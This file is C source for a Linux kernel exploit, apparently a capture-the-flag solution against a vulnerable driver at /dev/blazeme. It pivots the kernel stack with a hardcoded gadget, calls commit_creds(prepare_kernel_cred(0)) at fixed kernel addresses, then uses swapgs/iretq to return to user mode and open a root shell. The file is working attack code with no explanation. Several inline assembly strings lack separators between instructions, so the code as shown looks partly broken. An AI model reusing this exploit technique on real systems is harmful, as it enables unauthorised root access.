#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define commit_creds_addr 0xffffffff81063960ull
#define prepare_kernel_cred_addr 0xffffffff81063b50ull

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}

void escalate_priviledge()
{
	char* (*prepare_kernel_cred)(int) = prepare_kernel_cred_addr;
	void (*commit_creds)(char *) = commit_creds_addr;
	(*commit_creds)((*prepare_kernel_cred)(0));
	puts("[*] root now.");
}

void ret2usr()
{
	__asm__("swapgs;"
			"mov [rsp+0x20], user_ss"
			"mov [rsp+0x18], 0x1740000"
			"mov [rsp+0x10], user_rflags"
			"mov [rsp+0x08], user_cs"
			"mov [rsp+0x00], spawn_shell"
			"iretq"
		   );
}

void pwn()
{
	escalate_priviledge();
	ret2usr();
}

void spawn_shell()
{
	system("/bin/sh");
}

int main()
{
	save_status();

	size_t *fake_stack = mmap((void *)0x170000, 0x1000000, 3, 34, -1, 0);
	fake_stack[0x40000 / 8] = (size_t)pwn; // rsp

	size_t pivot[8] = {0};
	for(int i = 0; i < 8; i++)
	{
		pivot[i] = 0xffffffff8109c604ull;  // mov esp, 0x1740000; ret;
	}

	char payload[64];
	strncpy(payload, "AA", 2);
	strncpy(&payload[2], (const char *)pivot, 62);

	int fd = open("/dev/blazeme", 2);
	while(true)
	{
		write(fd, payload, 64);
	}
	return 0;
}

